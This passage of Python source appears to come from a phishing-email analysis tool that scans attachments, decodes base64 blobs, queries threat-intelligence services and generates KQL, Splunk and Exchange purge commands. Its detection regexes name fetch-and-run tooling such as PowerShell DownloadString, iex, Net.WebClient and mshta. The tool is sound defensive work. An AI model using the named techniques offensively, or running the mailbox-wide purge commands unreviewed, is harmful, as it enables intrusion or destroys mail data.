            text_for_scan = self.analyze_rtf(rec, data, flag)
        elif magic in ("HTML document", "SVG image (XML)", "Text / script"):
            text_for_scan = data.decode("utf-8", "replace")
            self.analyze_texty(rec, text_for_scan, magic, ext, flag)
        elif magic.startswith(("Windows shortcut", "OneNote", "PE", "ISO", "ELF", "Unknown", "RAR", "7-Zip", "Cabinet", "VHD")):
            text_for_scan = self.extract_strings(data)
            if magic.startswith("Windows shortcut"):
                flag("HIGH", "LNK shortcut file - commonly launches cmd/PowerShell", 3, ("T1204.002",), "malware")
            if magic.startswith("OneNote"):
                flag("HIGH", "OneNote file - may hide embedded scripts behind 'click to view' buttons", 3, ("T1204.002",), "malware")
            if magic.startswith(("ISO", "RAR", "7-Zip", "Cabinet", "VHD")):
                self.list_archive_external(rec, data, name, flag, text_for_scan)
        if text_for_scan:
            self.scan_strings(rec, text_for_scan, flag, magic)

        # IOCs
        self.ioc("sha256", rec["sha256"], f"Attachment {disp}")
        self.ioc("md5", rec["md5"], f"Attachment {disp}")
        self.ioc("filename", name, "Attachment name")
        for ip in rec["ips"]:
            self.ioc("ip", ip, f"IP found in {disp}")
        for u in rec["urls"]:
            self.analyze_url(u, f"attachment: {disp}")

    def pe_info(self, rec, data):
        try:
            off = int.from_bytes(data[0x3C:0x40], "little")
            if data[off:off + 4] == b"PE\0\0":
                ts = int.from_bytes(data[off + 8:off + 12], "little")
                chars = int.from_bytes(data[off + 22:off + 24], "little")
                rec["notes"].append("PE compile timestamp: " + datetime.fromtimestamp(ts, timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                                    + (" (DLL)" if chars & 0x2000 else " (EXE)"))
        except Exception:
            pass

    def extract_strings(self, data: bytes, cap=2_000_000):
        data = data[:cap * 4]
        a = re.findall(rb"[\x20-\x7e]{6,}", data)
        u = re.findall(rb"(?:[\x20-\x7e]\x00){6,}", data)
        out = [x.decode("ascii", "ignore") for x in a] + [x.decode("utf-16-le", "ignore") for x in u]
        return "\n".join(out)[:cap]

    def scan_strings(self, rec, text, flag, magic):
        urls = []
        for u in URL_RE.findall(text):
            u = u.rstrip(".,;:!?)>]'\"\\")
            if not noise_url(u) and u not in urls:
                urls.append(u)
        rec["urls"] = (rec["urls"] + [u for u in urls if u not in rec["urls"]])[:30]
        ips = []
        for ip in IPV4_RE.findall(text):
            if is_public_ip(ip) and ip not in ips and not ip.startswith(("0.", "255.")):
                ips.append(ip)
        if magic.startswith(("PE", "Unknown", "OLE2")):
            ips = [i for i in ips if i.count(".") == 3 and int(i.split(".")[0]) > 0][:10] if len(ips) < 15 else []
        rec["ips"] = list(dict.fromkeys(rec["ips"] + ips))[:20]
        done = set()
        for rx, desc, pts, mt in SUSP_RE:
            m = rx.search(text)
            if m and desc not in done:
                done.add(desc)
                rec["commands"].append(f"{desc}: {m.group(0)[:100]}")
                flag("HIGH" if pts >= 4 else "MEDIUM", f"Suspicious content: {desc}", pts, (mt,), "malware")
        for b in self.decode_blobs(text):
            rec["blobs"].append(b)
            if b["suspicious"]:
                flag("HIGH", f"Decoded base64 blob reveals: {b['kind']}", 4, ("T1140", "T1027"), "malware")
                for u in URL_RE.findall(b["preview"]):
                    if u not in rec["urls"]:
                        rec["urls"].append(u.rstrip("'\")"))

    def decode_blobs(self, text, limit=15):
        out = []
        for m in re.finditer(r"[A-Za-z0-9+/]{40,}={0,2}", text):
            s = m.group(0)
            try:
                raw = base64.b64decode(s + "=" * (-len(s) % 4))
            except Exception:
                continue
            if raw[:2] == b"MZ":
                out.append({"offset": m.start(), "enc_len": len(s), "preview": "MZ... (PE executable)",
                            "kind": "embedded PE executable", "suspicious": True})
            elif raw[:4] == b"PK\x03\x04":
                out.append({"offset": m.start(), "enc_len": len(s), "preview": "PK... (ZIP archive)",
                            "kind": "embedded ZIP archive", "suspicious": True})
            else:
                for enc in ("utf-16-le", "utf-8"):
                    try:
                        t = raw.decode(enc)
                    except Exception:
                        continue
                    if len(t) >= 10 and printable_ratio(t) > 0.92:
                        sus = bool(re.search(r"(?i)https?://|powershell|iex|invoke-|downloadstring|cmd\.exe|wscript|mshta|net\.webclient|frombase64", t))
                        out.append({"offset": m.start(), "enc_len": len(s), "preview": t[:300].replace("\n", " "),
                                    "kind": "script/command text" if sus else "text", "suspicious": sus})
                        break
            if len(out) >= limit:
                break
        return out

    def analyze_zip(self, rec, data, depth, flag, name):
        try:
            z = zipfile.ZipFile(io.BytesIO(data))
        except Exception:
            rec["notes"].append("ZIP structure unreadable (corrupt or truncated)")
            return ""
        names = z.namelist()
        rec["children"] = names[:80]
        enc = [i.filename for i in z.infolist() if i.flag_bits & 1]
        is_ooxml = any(n in ("[Content_Types].xml",) for n in names)
        scan = []
        if enc:
            flag("HIGH", f"Password-protected archive ({len(enc)} encrypted entries) - bypasses scanners", 3, ("T1027",), "malware")
        if is_ooxml:
            if any(n.lower().endswith("vbaproject.bin") for n in names):
                flag("HIGH", "VBA macro project (vbaProject.bin) inside Office file", 5, ("T1059.005", "T1204.002"), "malware")
            if any("macrosheets" in n.lower() for n in names):
                flag("HIGH", "Excel 4.0 (XLM) macro sheets present", 5, ("T1059.005",), "malware")
            if any("activex" in n.lower() for n in names):
                flag("MEDIUM", "ActiveX controls embedded", 2)
            if any(n.lower().startswith(("word/embeddings/", "xl/embeddings/", "ppt/embeddings/")) for n in names):
                flag("MEDIUM", "Embedded OLE objects", 2, ("T1204.002",))
            for n in names:
                if n.endswith(".rels"):
                    try:
                        x = z.read(n).decode("utf-8", "ignore")
                    except Exception:
                        continue
                    for tm in re.finditer(r'<Relationship [^>]*Target="([^"]+)"[^>]*TargetMode="External"[^>]*>', x):
                        tgt = tm.group(1)
                        if re.match(r"(?i)https?://|\\\\|file:", tgt) and not noise_url(tgt):
                            typ = re.search(r'Type="[^"]*/([A-Za-z]+)"', tm.group(0))
                            t = typ.group(1) if typ else "link"
                            sev = "HIGH" if t.lower() in ("attachedtemplate", "oleobject", "frame", "subdocument") else "MEDIUM"
                            flag(sev, f"External {t} relationship -> {defang(tgt)}", 5 if sev == "HIGH" else 2,
                                 ("T1221",) if t.lower() == "attachedtemplate" else (), "malware")
                            scan.append(tgt)
        else:
            risky = [n for n in names if os.path.splitext(n.lower())[1].lstrip(".") in EXEC_EXT or
                     os.path.splitext(n.lower())[1].lstrip(".") in ("iso", "img", "one", "docm", "xlsm", "html", "htm", "svg", "chm")]
            if risky:
                flag("HIGH", f"Archive contains risky file(s): {', '.join(risky[:6])}", 4, ("T1204.002",), "malware")
            if depth < 2:
                for info in z.infolist()[:40]:
                    if info.is_dir() or info.flag_bits & 1 or info.file_size > 8_000_000:
                        continue
                    try:
                        inner = z.read(info.filename)
                    except Exception:
                        continue
                    self.analyze_attachment(info.filename.split("/")[-1], "application/octet-stream", inner, depth + 1, rec["name"])
        return "\n".join(scan)

    def analyze_ole(self, rec, data, flag):
        macro = has_str(data, "VBA") or has_str(data, "_VBA_PROJECT") or has_str(data, "Macros")
        used_oletools = False
        try:
            from oletools.olevba import VBA_Parser  # type: ignore
            vp = VBA_Parser("x", data=data)
            if vp.detect_vba_macros():
                used_oletools = True
                macro = True
                for typ, kw, desc in vp.analyze_macros():
                    if typ in ("AutoExec", "Suspicious", "IOC"):
                        rec["commands"].append(f"olevba {typ}: {kw} - {desc}")
                vp.close()
        except Exception:
            pass
        if macro:
            flag("HIGH", "VBA macros detected in legacy Office file" + (" (olevba)" if used_oletools else " (heuristic - confirm with olevba)"),
                 5, ("T1059.005", "T1204.002"), "malware")
        if has_str(data, "EncryptedPackage"):
            flag("MEDIUM", "Password-encrypted Office document (hides content from scanners)", 3, ("T1027",))
        if any(has_str(data, k) for k in ("Equation.3", "EQNEDT32")):
            flag("HIGH", "Equation Editor object (CVE-2017-11882 style exploit vector)", 5, ("T1203",), "malware")
        return self.extract_strings(data)

    def analyze_rtf(self, rec, data, flag):
        t = data.decode("latin-1", "ignore")
        if re.search(r"\\objdata|\\objupdate|\\objclass", t, re.I):
            flag("HIGH", "RTF with embedded OLE object (\\objdata)", 4, ("T1204.002",), "malware")
        m = re.search(r"\{\\\*\\template\s+(https?://[^}\s]+)", t, re.I)
        if m:
            flag("HIGH", f"RTF remote template injection -> {defang(m.group(1))}", 5, ("T1221",), "malware")
            rec["urls"].append(m.group(1))
        if re.search(r"Equation\.3|EQNEDT32", t):
            flag("HIGH", "Equation Editor object in RTF", 5, ("T1203",), "malware")
        return t

    def analyze_pdf(self, rec, data, flag):
        norm = re.sub(rb"#([0-9A-Fa-f]{2})", lambda m: bytes([int(m.group(1), 16)]), data)
        counts = {k: len(re.findall(rb"/" + k.encode() + rb"\b", norm)) for k in
                  ("JavaScript", "JS", "OpenAction", "AA", "Launch", "EmbeddedFile", "URI", "AcroForm", "RichMedia",
                   "Encrypt", "ObjStm", "XFA", "SubmitForm", "GoToR")}
        rec["notes"].append("PDF keywords: " + ", ".join(f"/{k}={v}" for k, v in counts.items() if v))
        text = ""
        for m in list(re.finditer(rb"stream\r?\n(.*?)\r?\nendstream", norm, re.S))[:200]:
            try:
                dec = zlib.decompress(m.group(1))
                text += dec.decode("latin-1", "ignore") + "\n"
            except Exception:
                continue
        full = norm.decode("latin-1", "ignore") + "\n" + text
        if (counts["JavaScript"] or counts["JS"]) and (counts["OpenAction"] or counts["AA"]):
            flag("HIGH", "PDF auto-runs JavaScript (/JS + /OpenAction or /AA)", 5, ("T1204.002",), "malware")
        elif counts["JavaScript"] or counts["JS"]:
            flag("MEDIUM", "PDF contains JavaScript", 3, ("T1204.002",))
        if counts["Launch"]:
            flag("HIGH", "PDF /Launch action (runs external program)", 5, ("T1204.002",), "malware")
        if counts["EmbeddedFile"]:
            flag("MEDIUM", "PDF has embedded file(s)", 3, ("T1204.002",))
        if counts["RichMedia"] or counts["XFA"]:
            flag("MEDIUM", "PDF RichMedia/XFA content (rare, exploit surface)", 2)
        if counts["SubmitForm"]:
            flag("MEDIUM", "PDF form submits data to remote server", 3)
        if counts["Encrypt"]:
            flag("LOW", "PDF is encrypted", 1)
        uris = [x.decode("latin-1", "ignore") for x in re.findall(rb"/URI\s*\(([^)]{4,400})\)", norm)]
        uris += re.findall(r"/URI\s*\(([^)]{4,400})\)", text)
        for u in dict.fromkeys(uris):
            if re.match(r"(?i)https?://", u) and not noise_url(u):
                rec["urls"].append(u)
        if rec["urls"]:
            rec["notes"].append(f"{len(rec['urls'])} URI(s) embedded - PDF is probably a link lure")
            self.tags.add("link")
        return full

    def analyze_texty(self, rec, text, magic, ext, flag):
        hits = self.scan_html_patterns(text)
        smuggle = any("SMUGGLING" in d for d, _p, _m in hits)
        for d, pts, mt in hits:
            if pts >= 2:
                flag("HIGH" if pts >= 4 else "MEDIUM", f"{d}", pts, (mt,) if mt else (), "malware" if smuggle else "cred")
        if magic.startswith("SVG") and re.search(r"<script|onload\s*=|<foreignObject", text, re.I):
            flag("HIGH", "SVG file contains active content (script/foreignObject) - SVG smuggling/phish", 5, ("T1027.006",), "malware")
        if magic == "HTML document":
            self.tags.add("cred")
            if re.search(r"(?i)type\s*=\s*[\"']?password", text):
                self.html_cred_attach = True
            if len(text) < 6000 and re.search(r"(?i)<form", text):
                rec["notes"].append("Small local HTML page with a form: likely credential-harvesting page (opens locally, evades URL scanning)")
        if magic == "Text / script" and ext in ("js", "vbs", "ps1", "bat", "cmd", "hta", "wsf", "vbe", "jse"):
            rec["notes"].append("Script file - read in an editor / sandbox; never run on host")

    def list_archive_external(self, rec, data, name, flag, strings):
        tool = next((t for t in ("7zz", "7z", "7za") if shutil.which(t)), None)
        if tool:
            try:
                tmp = os.path.join(self.args.out, "_tmp_" + rec["sha256"][:8])
                os.makedirs(tmp, exist_ok=True)
                p = os.path.join(tmp, "sample.bin")
                with open(p, "wb") as f:
                    f.write(data)
                r = subprocess.run([tool, "l", "-slt", p], capture_output=True, text=True, timeout=30)
                files = re.findall(r"^Path = (.+)$", r.stdout, re.M)[1:]
                rec["children"] = files[:80]
                risky = [x for x in files if os.path.splitext(x.lower())[1].lstrip(".") in EXEC_EXT]
                if risky:
                    flag("HIGH", f"Container holds risky file(s): {', '.join(risky[:6])}", 4, ("T1204.002",), "malware")
                shutil.rmtree(tmp, ignore_errors=True)
                return
            except Exception:
                pass
        found = sorted(set(re.findall(r"([\w\-. ]{1,60}\.(?:lnk|exe|dll|js|vbs|hta|bat|cmd|scr|ps1|msi|jar))(?:;1)?", strings, re.I)))
        if found:
            rec["children"] = found[:40]
            flag("HIGH", f"Container appears to hold risky file(s): {', '.join(found[:6])} (install p7zip for exact listing)", 4, ("T1204.002",), "malware")
        else:
            rec["notes"].append("Cannot list contents (install p7zip / 7z)")

    # ---- online enrichment --------------------------------------------------
    def online_checks(self):
        a = self.args
        # DNS for sender domain
        if self.from_domain:
            spf = [t for t in (dns_txt(self.from_domain) or []) if t.lower().startswith("v=spf1")]
            dmarc = [t for t in (dns_txt("_dmarc." + self.from_domain) or []) if t.lower().startswith("v=dmarc1")]
            self.dns = {"spf": spf, "dmarc": dmarc}
            pol = re.search(r"\bp=(\w+)", dmarc[0]) if dmarc else None
            if not dmarc:
                self.add("Authentication", "MEDIUM", f"No DMARC record for {self.from_domain}",
                         "Domain can be spoofed freely.", 1)
            elif pol and pol.group(1).lower() == "none":
                self.add("Authentication", "LOW", f"DMARC policy is p=none for {self.from_domain}", "Monitoring only - spoofed mail is delivered.", 1)
            if not spf:
                self.add("Authentication", "LOW", f"No SPF record for {self.from_domain}", "", 1)
        # domain ages
        doms = {registered_domain(self.from_domain)}
        for r in self.urls[:15]:
            if r["pts"] >= 2 and not re.fullmatch(r"[\d.:]+", r["reg"]):
                doms.add(r["reg"])
        rp_dom = getattr(self, "return_path", "").rsplit("@", 1)[-1]
        if rp_dom:
            doms.add(registered_domain(rp_dom))
        for d in sorted(x for x in doms if x and "." in x)[:10]:
            age = domain_age_days(d)
            self.domain_age[d] = age
            if age is None:
                continue
            if age < 30:
                self.add("Authentication" if d == registered_domain(self.from_domain) else "URL", "HIGH",
                         f"Domain {d} registered only {age} day(s) ago", "Young domains are a top phishing indicator.", 3, ("T1583.001",), "newdomain")
            elif age < 90:
                self.add("Authentication" if d == registered_domain(self.from_domain) else "URL", "MEDIUM",
                         f"Domain {d} is young ({age} days)", "", 1)
        # reverse DNS of origin
        if self.origin_ip:
            try:
                self.rdns = socket.gethostbyaddr(self.origin_ip)[0]
            except Exception:
                self.rdns = ""
        # DKIM verify
        try:
            import dkim  # type: ignore
            if self.msg.get("DKIM-Signature"):
                ok = dkim.verify(self.raw)
                self.authinfo["dkim_local_verify"] = bool(ok)
                if not ok:
                    self.add("Authentication", "MEDIUM", "Local DKIM verification FAILED", "(dkimpy)", 2)
        except Exception:
            pass
        # VirusTotal / AbuseIPDB
        vt = a.vt_key or os.environ.get("VT_API_KEY")
        ab = a.abuse_key or os.environ.get("ABUSEIPDB_API_KEY")
        if vt:
            targets = [("file", x["sha256"], x["name"]) for x in self.attachments[:10]]
            targets += [("ip", i, "origin/hop IP") for i in list(dict.fromkeys([self.origin_ip] + [p for h in self.hops for p in h["public"]])) if i][:5]
            for d in sorted({r["reg"] for r in self.urls if r["pts"] >= 2 and not re.fullmatch(r"[\d.:]+", r["reg"])})[:6]:
                targets.append(("domain", d, "URL domain"))
            for r in [r for r in self.urls if r["pts"] >= 3][:5]:
                targets.append(("url", r["url"], "suspicious URL"))
            for kind, val, ctx in targets:
                res = vt_lookup(vt, kind, val)
                if not res:
                    continue
                res.update({"kind": kind, "value": val, "context": ctx})
                self.intel["vt"].append(res)
                mal = res.get("malicious", 0) + res.get("suspicious", 0) * 0.5
                if res.get("found") and mal >= 1:
                    self.add("Intel", "CRITICAL" if mal >= 5 else "HIGH", f"VirusTotal flags {kind} as malicious ({res['malicious']} malicious / {res['suspicious']} suspicious)",
                             f"{defang(val) if kind in ('url', 'domain', 'ip') else val} {res.get('label', '')}", 8 if mal >= 5 else 5, tag="intel")
        else:
            self.intel["notes"].append("VirusTotal skipped (set VT_API_KEY or --vt-key)")
        if ab:
            for ip in list(dict.fromkeys([self.origin_ip] + [p for h in self.hops for p in h["public"]]))[:5]:
                if not ip:
                    continue
                res = abuse_lookup(ab, ip)
                if res:
                    self.intel["abuseipdb"].append(res)
                    if res.get("score", 0) >= 50:
                        self.add("Intel", "HIGH", f"AbuseIPDB confidence {res['score']}% for {defang(ip)}",
                                 f"{res.get('isp', '')} / {res.get('country', '')} / {res.get('reports', 0)} reports", 5, tag="intel")
                    elif res.get("score", 0) >= 15:
                        self.add("Intel", "MEDIUM", f"AbuseIPDB confidence {res['score']}% for {defang(ip)}", "", 2)
        else:
            self.intel["notes"].append("AbuseIPDB skipped (set ABUSEIPDB_API_KEY or --abuse-key)")

    # ---- scoring ------------------------------------------------------------
    def score(self):
        per = {}
        for f in self.findings:
            per[f["cat"]] = per.get(f["cat"], 0) + f["pts"]
        self.scores = {c: (min(per.get(c, 0), cap), per.get(c, 0), cap) for c, cap in CAT_CAPS.items()}
        self.total = sum(v[0] for v in self.scores.values())
        t = self.total
        self.verdict = ("MALICIOUS" if t >= 16 else "SUSPICIOUS" if t >= 8 else "LOW RISK / LIKELY SPAM" if t >= 3 else "NO SIGNIFICANT INDICATORS")
        # strong single signals escalate
        strong = [f for f in self.findings if f["sev"] == "CRITICAL" or (f["cat"] == "Attachment" and f["pts"] >= 5) or
                  "SMUGGLING" in f["title"].upper()]
        if strong and self.verdict in ("SUSPICIOUS", "LOW RISK / LIKELY SPAM"):
            self.verdict = "MALICIOUS" if any(f["sev"] == "CRITICAL" or f["pts"] >= 6 for f in strong) else "SUSPICIOUS"
        cats = sum(1 for v in self.scores.values() if v[0] > 0)
        self.confidence = "HIGH" if cats >= 3 and t >= 12 else "MEDIUM" if cats >= 2 else "LOW"
        a = self.args
        mal = self.verdict in ("MALICIOUS", "SUSPICIOUS")
        if a.executed:
            self.severity = "CRITICAL" if self.verdict == "MALICIOUS" else "HIGH"
        elif a.creds or a.mfa:
            self.severity = "HIGH"
        elif a.clicked:
            self.severity = "MEDIUM"
        elif mal:
            self.severity = "LOW" if self.verdict == "SUSPICIOUS" or not (a.targeted) else "MEDIUM"
        else:
            self.severity = "INFORMATIONAL"
        if a.targeted and mal and not (a.executed or a.creds or a.mfa or a.clicked):
            self.severity = "MEDIUM"
        # classification
        tg = self.tags
        if "malware" in tg:
            self.classification = "Malware delivery"
        elif "extortion" in tg:
            self.classification = "Extortion / sextortion"
        elif "toad" in tg:
            self.classification = "Callback phishing (TOAD)"
        elif "qr" in tg:
            self.classification = "QR-code phishing (quishing) / credential harvesting"
        elif "cred" in tg or "link" in tg:
            self.classification = "Credential harvesting phishing"
        elif "bec" in tg or "fin" in tg:
            self.classification = "Business Email Compromise / payment fraud"
        elif "spoof" in tg or "brand" in tg:
            self.classification = "Spoofing / impersonation"
        else:
            self.classification = "Unclassified / spam"
        if "cred" in tg or "link" in tg:
            self.mitre.update({"T1566.002", "T1598.003"})
        if "bec" in tg:
            self.mitre.add("T1656")
        if a.creds or a.mfa:
            self.mitre.add("T1078")
        if self.verdict in ("MALICIOUS", "SUSPICIOUS"):
            self.mitre.add("T1566")


# ----------------------------------------------------------------------------
# ONLINE HELPERS (only with --online)
# ----------------------------------------------------------------------------
def dns_txt(name):
    try:
        import dns.resolver  # type: ignore
        out = []
        for r in dns.resolver.resolve(name, "TXT", lifetime=6):
            out.append("".join(x.decode() if isinstance(x, bytes) else x for x in r.strings))
        return out
    except ImportError:
        pass
    except Exception:
        return []
    if shutil.which("dig"):
        try:
            r = subprocess.run(["dig", "+short", "+time=4", "+tries=1", "TXT", name], capture_output=True, text=True, timeout=12)
            return [re.sub(r'"\s*"', "", ln).strip('"') for ln in r.stdout.splitlines() if ln.strip()]
        except Exception:
            return []
    if shutil.which("nslookup"):
        try:
            r = subprocess.run(["nslookup", "-type=TXT", name], capture_output=True, text=True, timeout=12)
            return re.findall(r'"([^"]+)"', r.stdout)
        except Exception:
            return []
    return None


def http_json(url, headers=None, timeout=15):
    req = urllib.request.Request(url, headers=headers or {"User-Agent": "phishscan/" + VERSION})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


def domain_age_days(domain):
    """Domain age via RDAP (stdlib) then whois CLI fallback."""
    try:
        j = http_json("https://rdap.org/domain/" + domain, {"User-Agent": "phishscan/" + VERSION, "Accept": "application/rdap+json"})
        for ev in j.get("events", []):
            if ev.get("eventAction") in ("registration", "created"):
                d = datetime.fromisoformat(ev["eventDate"].replace("Z", "+00:00"))
                if d.tzinfo is None:
                    d = d.replace(tzinfo=timezone.utc)
                return max((datetime.now(timezone.utc) - d).days, 0)
    except Exception:
        pass
    if shutil.which("whois"):
        try:
            r = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=25)
            m = re.search(r"(?im)^\s*(?:creation date|created(?: on)?|registered on|domain registration date|registration time)\s*[:.]\s*(.+)$", r.stdout)
            if m:
                s = m.group(1).strip()
                d = re.search(r"(\d{4})-(\d{2})-(\d{2})", s)
                if d:
                    dt_ = datetime(int(d.group(1)), int(d.group(2)), int(d.group(3)), tzinfo=timezone.utc)
                    return max((datetime.now(timezone.utc) - dt_).days, 0)
        except Exception:
            pass
    return None


def vt_lookup(key, kind, val):
    base = "https://www.virustotal.com/api/v3/"
    path = {"file": f"files/{val}", "ip": f"ip_addresses/{val}", "domain": f"domains/{val}",
            "url": "urls/" + base64.urlsafe_b64encode(val.encode()).decode().strip("=")}[kind]
    for attempt in range(2):
        try:
            j = http_json(base + path, {"x-apikey": key, "User-Agent": "phishscan/" + VERSION})
            at = j["data"]["attributes"]
            st = at.get("last_analysis_stats", {})
            label = ""
            ptc = at.get("popular_threat_classification") or {}
            if ptc.get("suggested_threat_label"):
                label = f"[{ptc['suggested_threat_label']}]"
            elif at.get("meaningful_name"):
                label = f"[{at['meaningful_name']}]"
            return {"found": True, "malicious": st.get("malicious", 0), "suspicious": st.get("suspicious", 0),
                    "harmless": st.get("harmless", 0), "undetected": st.get("undetected", 0), "label": label,
                    "as_owner": at.get("as_owner", ""), "country": at.get("country", ""),
                    "reputation": at.get("reputation", "")}
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return {"found": False, "malicious": 0, "suspicious": 0}
            if e.code == 429 and attempt == 0:
                time.sleep(20)
                continue
            return {"found": False, "malicious": 0, "suspicious": 0, "error": f"HTTP {e.code}"}
        except Exception as e:
            return {"found": False, "malicious": 0, "suspicious": 0, "error": str(e)[:80]}
        time.sleep(1)
    return None


def abuse_lookup(key, ip):
    try:
        j = http_json("https://api.abuseipdb.com/api/v2/check?" + urllib.parse.urlencode({"ipAddress": ip, "maxAgeInDays": 90}),
                      {"Key": key, "Accept": "application/json", "User-Agent": "phishscan/" + VERSION})
        d = j["data"]
        return {"ip": ip, "score": d.get("abuseConfidenceScore", 0), "country": d.get("countryCode", ""),
                "isp": d.get("isp", ""), "usage": d.get("usageType", ""), "reports": d.get("totalReports", 0),
                "domain": d.get("domain", "")}
    except Exception:
        return None


# ----------------------------------------------------------------------------
# REPORT BUILDING
# ----------------------------------------------------------------------------
def kql_list(vals):
    return ", ".join('"%s"' % v.replace("\\", "\\\\").replace('"', '\\"') for v in vals)


def build_queries(an: Analysis, case_id: str):
    senders = sorted({i["value"] for i in an.iocs if i["type"] == "email" and any(k in i["context"] for k in ("From", "Return-Path", "Reply-To"))})
    domains = {r["reg"] for r in an.urls if r["pts"] >= 2 and r["reg"] and not re.fullmatch(r"[\d.:]+", r["reg"])}
    if an.from_domain:
        domains.add(registered_domain(an.from_domain))
    domains = sorted(domains)
    domains = sorted(d for d in domains if d)
    ips = sorted({i["value"] for i in an.iocs if i["type"] == "ip"})
    hashes = sorted({a["sha256"] for a in an.attachments})
    subj = an.subject.replace('"', '\\"')
    q = {}
    q["Who received it (EmailEvents)"] = f"""EmailEvents
| where Timestamp > ago(30d)
| where SenderFromAddress in~ ({kql_list(senders) or '""'}) or Subject == "{subj}"{' or SenderIPv4 in (' + kql_list([i for i in ips]) + ')' if ips else ''}
| project Timestamp, RecipientEmailAddress, SenderFromAddress, SenderMailFromAddress, SenderIPv4, Subject, DeliveryAction, DeliveryLocation, NetworkMessageId
| order by Timestamp asc"""
    if domains:
        q["Emails containing the malicious domains (EmailUrlInfo)"] = f"""EmailUrlInfo
| where Timestamp > ago(30d)
| where UrlDomain has_any ({kql_list(domains)})
| join kind=inner EmailEvents on NetworkMessageId
| project Timestamp, RecipientEmailAddress, SenderFromAddress, Url, UrlDomain, Subject, DeliveryLocation"""
        q["Who clicked (UrlClickEvents)"] = f"""UrlClickEvents
| where Timestamp > ago(30d)
| where Url has_any ({kql_list(domains)})
| project Timestamp, AccountUpn, Url, ActionType, IsClickedThrough, NetworkMessageId
| order by Timestamp asc"""
        q["Endpoint/proxy connections to the domains (DeviceNetworkEvents)"] = f"""DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ({kql_list(domains)}){' or RemoteIP in (' + kql_list(ips) + ')' if ips else ''}
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort"""
    if hashes:
        q["Attachment delivered / executed"] = f"""union
(EmailAttachmentInfo | where Timestamp > ago(30d) | where SHA256 in ({kql_list(hashes)}) | project Timestamp, Source="Mail", Who=RecipientEmailAddress, FileName, SHA256),
(DeviceFileEvents | where Timestamp > ago(30d) | where SHA256 in ({kql_list(hashes)}) | project Timestamp, Source="Endpoint", Who=DeviceName, FileName, SHA256)
| order by Timestamp asc"""
    q["Sign-ins of exposed users (replace list)"] = """let victims = dynamic(["victim1@company.com"]);
SigninLogs
| where TimeGenerated > ago(14d) and UserPrincipalName in~ (victims)
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ClientAppUsed, ResultType,
          AuthenticationRequirement, ConditionalAccessStatus, DeviceDetail
| order by TimeGenerated desc
// look for: new country, impossible travel, legacy auth, "Device Code" flow, unfamiliar apps"""
    q["Malicious inbox rules / forwarding"] = """CloudAppEvents
| where Timestamp > ago(14d)
| where ActionType in ("New-InboxRule","Set-InboxRule","UpdateInboxRules","Set-Mailbox")
| extend Raw = tostring(RawEventData)
| where Raw has_any ("ForwardTo","RedirectTo","ForwardAsAttachmentTo","DeleteMessage","MoveToFolder","RSS","Archive")
| project Timestamp, AccountDisplayName, ActionType, Raw"""
    q["New MFA method / OAuth consent"] = """AuditLogs
| where TimeGenerated > ago(14d)
| where OperationName has_any ("security info","authentication method","Consent to application","Add OAuth2PermissionGrant","Add service principal")
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, Result"""
    purge = f"""# Exchange Online / Purview: find then purge (review the preview count first!)
Connect-IPPSSession
New-ComplianceSearch -Name "{case_id}" -ExchangeLocation All -ContentMatchQuery 'from:"{an.from_addr}" AND subject:"{an.subject.replace("'", "''")}"'
Start-ComplianceSearch -Identity "{case_id}"
# after reviewing results:
New-ComplianceSearchAction -SearchName "{case_id}" -Purge -PurgeType SoftDelete

# After credential exposure (per user):
Revoke-MgUserSignInSession -UserId victim@company.com
Get-InboxRule -Mailbox victim@company.com | fl Name,Enabled,ForwardTo,ForwardAsAttachmentTo,RedirectTo,DeleteMessage,MoveToFolder
Get-Mailbox victim@company.com | fl ForwardingAddress,ForwardingSmtpAddress,DeliverToMailboxAndForward"""
    splunk = f"""index=proxy OR index=dns OR index=firewall earliest=-30d
({' OR '.join('url_domain="%s" OR query="%s"' % (d, d) for d in domains[:8]) or 'url_domain="-"'}{(' OR dest_ip IN (' + ','.join('"%s"' % i for i in ips) + ')') if ips else ''})
| stats count min(_time) as first max(_time) as last values(src) as sources by url_domain dest_ip"""
    return q, purge, splunk


def pivots(an: Analysis):
    out = []
    for d in sorted({r["reg"] for r in an.urls if r["pts"] >= 2 and not re.fullmatch(r"[\d.:]+", r["reg"])} | ({registered_domain(an.from_domain)} if an.from_domain else set()))[:6]:
        out.append(("Domain " + defang(d), [
            f"urlscan.io search : https://urlscan.io/search/#domain%3A{d}".replace("https", "hxxps").replace(".io", "[.]io"),
            f"crt.sh (sibling domains): https://crt.sh/?q=%25.{d}".replace("https", "hxxps"),
            f"VirusTotal: https://www.virustotal.com/gui/domain/{d}".replace("https", "hxxps"),
            f"WHOIS/RDAP: rdap.org/domain/{d}".replace("https", "hxxps"),
            "Shodan/Censys: pivot on the hosting IP, favicon hash, and page title"]))
    if an.origin_ip:
        out.append(("Origin IP " + defang(an.origin_ip), [
            f"AbuseIPDB: abuseipdb[.]com/check/{an.origin_ip}", f"Shodan: shodan[.]io/host/{an.origin_ip}",
            f"VirusTotal: virustotal[.]com/gui/ip-address/{an.origin_ip}"]))
    for a in an.attachments[:5]:
        out.append((f"Hash {a['name']}", [f"VirusTotal: virustotal[.]com/gui/file/{a['sha256']}",
                                          f"Hybrid Analysis / any.run / MalwareBazaar search by SHA256"]))
    return out


def response_plan(an: Analysis):
    a = an.args
    steps = []
    mal = an.verdict in ("MALICIOUS", "SUSPICIOUS")
    steps.append(("Always (verdict: %s)" % an.verdict, [
        "Purge the message from ALL mailboxes (Threat Explorer / Content Search + purge)",
        "Block sender address, sender domain, URL domains and origin IP at gateway, proxy, DNS and firewall",
        "Add IOCs (see IOC section / iocs.csv) to SIEM, EDR custom indicators and threat-intel platform",
        "Search for other recipients, clickers and endpoint hits (queries in the Scope section)",
        "Report URL/domain for takedown (registrar, host, Google Safe Browsing, PhishTank, Microsoft)",
        "Notify the reporting user of the outcome; create/update detection rules"]) if mal else
        ("No malicious verdict", ["Close as benign/spam; consider tuning filter or marketing allow-list if appropriate."]))
    if a.clicked and not (a.creds or a.mfa or a.executed):
        steps.append(("User CLICKED the link", [
